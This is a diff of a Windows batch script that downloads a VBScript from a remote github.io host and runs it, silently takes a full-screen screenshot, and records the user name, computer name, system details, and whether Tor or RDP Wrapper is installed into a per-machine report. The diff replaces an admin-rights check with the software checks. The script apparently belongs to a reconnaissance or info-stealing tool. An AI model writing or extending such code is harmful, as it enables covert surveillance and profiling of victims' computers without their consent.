@@ -28,14 +28,20 @@ curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osi
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
-echo      Admin Rights Check: >> "%username%@%computername%.txt"
+echo >> "%username%@%computername%.txt"
+echo      Installed Services: >> "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
-NET SESSION >nul 2>&1
-IF %ERRORLEVEL% EQU 0 (
-ECHO      Administrator PRIVILEGES Detected! >> "%username%@%computername%.txt"
+IF EXIST "C:\Tor\tor.exe" (
+  echo    Tor is installed! >> "%username%@%computername%.txt"
 ) ELSE (
-ECHO      NOT AN ADMIN! >> "%username%@%computername%.txt"
+  echo.
 )
+IF EXIST "C:\Program Files\RDP Wrapper\rdpwrap.ini" (
+  echo    RDO Wrapper is installed! >> "%username%@%computername%.txt"
+) ELSE (
+  echo.
+)
+echo >> "%username%@%computername%.txt"
 "%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
 
